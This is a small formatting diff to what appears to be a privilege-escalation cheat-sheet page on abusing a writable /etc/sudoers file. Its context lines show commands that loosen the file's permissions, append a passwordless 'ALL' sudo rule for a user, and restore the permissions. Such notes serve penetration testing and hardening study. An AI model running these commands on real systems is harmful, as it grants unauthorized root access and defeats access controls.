@@ -6,8 +6,6 @@ tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
 
 #### Abuse #1: Writable /etc/sudoers
 
-<div>
-
 ```console
 chmod 600 /etc/sudoers
 ```
@@ -19,7 +17,3 @@ echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 ```console
 chmod 440 /etc/sudoers
 ```
-
-</div>
-
-<br>
